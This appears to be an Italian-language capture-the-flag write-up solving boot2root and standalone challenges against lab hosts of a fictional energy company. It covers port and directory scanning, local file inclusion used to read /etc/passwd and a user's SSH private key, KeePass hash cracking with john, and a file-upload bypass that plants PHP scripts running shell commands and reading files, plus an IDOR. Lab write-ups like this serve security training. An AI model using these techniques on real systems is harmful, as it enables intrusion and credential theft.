# boot 2 root
## B2R01
Banalmente:
```bash
nmap -sS -sC -sV 192.168.14.27 --exclude-ports 65432
```

```nmap
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 62:2a:af:d8:f3:0d:6d:09:d6:74:a4:cc:ac:39:1c:64 (ECDSA)
|_  256 57:17:10:45:1c:3e:e5:75:ba:a9:40:f3:a7:8c:5c:25 (ED25519)
80/tcp  open  http     nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.22.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=muntrea-energy.vdsi/organizationName=Muntrea Energy/stateOrProvinceName=Verante/countryName=IT
| Not valid before: 2026-05-14T15:27:23
|_Not valid after:  2027-05-14T15:27:23
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: Muntrea Energy | Powering the Future
|_http-server-header: nginx/1.22.1
Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Risposta**: Le porte aperte sono 4.

**Inoltre**: Dall'output so che ci sono i servizi `ftp, ssh, http, https` , ed `nmap`, guardando il certificato `tls` mi dice e' stato firmato dall'host `muntrea-energy.vdsi`
* **Sito http**: se provo a connettermi con http all'host ottengo solo un sito placeholder di nginx
* **Sito https**: se provo a connettermi con https invece ottengo un sito web con un contenuto piu interessante. 
## B2R02
Per trovare la directory:
```bash
$ gobuster dir -u https://192.168.14.27/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -k
```
* `-k`: per disabilitare la verifica del certificato, altrimenti non si riesce a stabilire la connessione

Scopro che esiste la cartella `internal`. Ripetendo con `-u https://192.168.14.27/internal` trovo la cartella `resources`.  Ripeto di nuovo e trovo la cartella `backup`

Se faccio una richiesta `https` con `URL`: `https://192.168.14.27/internal/resources/backup/` posso navigare l'indice di questa cartella e scaricare dei file.

**Risposta**: `https://192.168.14.27/internal/resources/backup/`
# B2R03 
Il file `temp5712837.bak` e' quello che mi interessa:
```bash
$ cat Downloads/temp5712837.bak 
[DEPRECATED FTP CONFIG]
USER=muntrea-filemanager
PASS=Muntrea2026!
REMOTE_PATH=/backup/manuals
STAMP=20260513
```

**Nota**: il contenuto mi dice che probabilmente queste sono credenziali `ftp`

**Risposta**: `muntrea-filemanager:Muntrea2026!`

## B2R04
Accedo con `ftp`, e mi collego con le credenziali trovate in `B2R03`. Dentro `docs` trovo un file `pdf` con dentro le seguenti informazioni:
* **La dashboard** si trova in `/v1/adm1n/d4shb0ard/` ma posso accederci solo impostando un `vhost` ad-hoc.
* Standard di Autenticazione: `RSA Private Key`.

**Risposta**: `RSA Private Key`
## B2R05
Da `B2R01` sappiamo che un `hostname` valido per il sito e' `muntrea-energy.vdsi`, se provo a connettermi ad `https://muntrea-energy.vdsi/v1/adm1n/d4shb0ard/` specificando in `/etc/hosts` la mappatura `192.168.14.27 muntrea-energy.vdsi` tutta via non riesco a connettermi.

Devo ottenere il sottodominio:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://muntrea-energy.vdsi/ -H "HOST: FUZZ.muntrea-energy.vdsi" -fs 1950
```
**Soluzione**: Ottienamo che il `vhost` e' `control.muntrea-energy.vdsi`

## B2R06
Considerando l'url:
```url
https://control.muntrea-energy.vdsi/v1/adm1n/d4shb0ard/?page=plant&plant_id=sections/reactor-1
```
**Soluzione**: allora, `plant_id` e' il parametro.

## B2R07
Per ottenere la lista degli utenti posso sfruttare la pagina:
```bash
https://control.muntrea-energy.vdsi/v1/adm1n/d4shb0ard/?page=plant&plant_id=/etc/passwd
```

**Soluzione**: tra tutti l'utente piu' probabile per tale ruolo e' `muntrea-operator`

## B2R08
Avendo accesso al file system, posso prendere la chiave RSA dell'utente `muntrea-operator` e accedere, sperando lui abbia la flag.

La chiave RSA si trova in:
```
### /home/muntrea-operator/.ssh/id_rsa
```

cambio i permessi e mi connetto con rsa:
```
chmod 600 id_rsa
ssh -i id_rsa 192.168.14.27
```

e navigando trovo la flag!


# STDNA
## STDNA01
`.kdbx`: e' un file database keepass, dunque estriamo l'hash da questo file per darlo a john.

**Estrazione hash**: `keepass2john secrets.kdbx > secrets.john`
**Come si chiama il formato in john?** `john --list=formats | grep KeePass`
**Trova la password originale**: `john --format=KeePass secrets.john --wordlist=~/rockyou.txt`

**La password ottenuta e'**: `strawberry123`

Ora posso leggere il contenuto del `.kdbx`, usano un software trovato online:
![[Pasted image 20260518015705.png]]
La flag e' dunque: `VDSI{k33p4ss_cr4ck_succ3ss_2026}`


## STDNA02
Il database, contiene la password per decifrare il `.zip`, ossia `pcap_hunter_2026`.

Nel file `.pcap`, applico con **wireshark il filtro**: `tcp.dstport >= 60000 && http.request.method=="POST"`.
Ci sono molti pacchetti da guardare ancora, provo ad ordinarli secondo qualche criterio, magari riesco ad individuare facilmente la flag.

**Se provo ad ordinarli per lunghezza**: mi accorgo che il messaggio più lungo e' quello che cercavo, e contiene la flag!

**La flag e' dunque**: `VDSI{pcap_f1lt3r_m4st3r_found_it}`.

Mi sono accorto che il metodo più efficace sarebbe stato filtrare in base al contenuto della richiesta post, es: la richiesta http contiene `VDSI`.

# STNDB
## STNDB01
Provando a caricare un file, per esempio l'eseguibile di `bash`, mi viene detto che questo viene salvato in `/uploads/bash`

Ho chiesto a gemini di generare il seguente codice per ottenere il nome utente:
```php
<?php
// Metodo 1: Utilizzando la funzione posix (più dettagliato su sistemi Linux) 
if (function_exists('posix_getpwuid')) { $user_info = posix_getpwuid(posix_geteuid()); echo "Nome Utente (POSIX): " . $user_info['name'] . "<br>"; } 
// Metodo 2: Eseguendo il comando di sistema 'whoami' 
$system_user = shell_exec('whoami'); echo "Nome Utente (Sistema): " . trim($system_user) . "<br>"; 
// Metodo 3: Mostrare l'ID utente e i gruppi (utile per i permessi) 
$id_info = shell_exec('id'); echo "Dettagli ID: <pre>" . $id_info . "</pre>";
?>
```

Con `burp` tento di caricare il file `php` chiamandolo `remote.php`, e modifico `Content-Type` della richiesta in `application/octet-stream`. Se non facessi cosi il server si accorgerebbe che sto caricando un file `.php`.

Noto inoltre, guardando l'output del sito che tutti i file caricati vengono messi in `/uploads` e possono essere consultati.

Dunque con l'URL: `http://192.168.14.27:[port]/uploads/remote.php` posso far eseguire al server codice `php` arbitrario

![[Pasted image 20260518143949.png]]

dunque l'utente che ci interessa e' `vaccine-admin`.

Ho bisogno di due script da caricare sul serve similmente a come fatto prima.

`readfile.php`, ossia mi permette di leggere il file `f=...`:
```php
<?php
// Controlla se il parametro 'f' è presente nell'URL
if (isset($_GET['f'])) {
    $file = $_GET['f'];
    echo "<h3>Analisi di: " . htmlspecialchars($file) . "</h3>";
    echo "<hr>";
    if (file_exists($file)) {
        // Legge il file e lo stampa in un blocco preformattato per mantenere il layout
        $content = @file_get_contents($file);
        
        if ($content !== false) {
            echo "<pre>" . htmlspecialchars($content) . "</pre>";
        } else {
            echo "<b>Errore:</b> Impossibile leggere il file. Permessi insufficienti.";
        }
    } else {
        echo "<b>Errore:</b> Il file non esiste.";
    }
} else {
    echo "Utilizzo: aggiungi <b>?f=/percorso/del/file</b> all'URL.";
}
?>
```

`ls.php`, ossia un rimpiazzo per `ls`, mostra il contenuto di `d=...`:
```php
<?php
// Prende la cartella dal parametro 'd' (es: ?d=/home/vaccine_admin/)
$dir = isset($_GET['d']) ? $_GET['d'] : '.';

echo "<h3>Contenuto di: " . htmlspecialchars($dir) . "</h3>";
echo "<hr>";

if (is_dir($dir)) {
    // Prova ad aprire la directory
    if ($dh = opendir($dir)) {
        echo "<ul>";
        while (($file = readdir($dh)) !== false) {
            // Ignora i puntatori alla directory stessa (opzionale)
            if ($file == "." || $file == "..") continue;

            $fullPath = rtrim($dir, '/') . '/' . $file;
            $type = is_dir($fullPath) ? "[DIR]" : "[FILE]";
            
            // Visualizza nome, tipo e permessi base
            echo "<li><strong>$type</strong> " . htmlspecialchars($file) . "</li>";
        }
        echo "</ul>";
        closedir($dh);
    } else {
        echo "<b>Errore:</b> Impossibile aprire la directory. Permessi negati.";
    }
} else {
    echo "<b>Errore:</b> Il percorso specificato non è una directory.";
}
?>
```


**risposta**: usando questi due tool sono in grado di leggere il contenuto di `/home/vaccine-admin/vault/secret.txt`, che contiene la flag.
# STNDB02
Pensando di star risolvendo la 01, ho notato che gli id dei report generati sono incrementali. Ho provato a caso, a richiedere il report con `id=1`, ossia: `http://192.168.14.27:65432/view_report.php?id=1`.

**Ottengo in risposta nel report la flag**: `VDSI{1d0r_r3p0rt_d1scl0sur3}`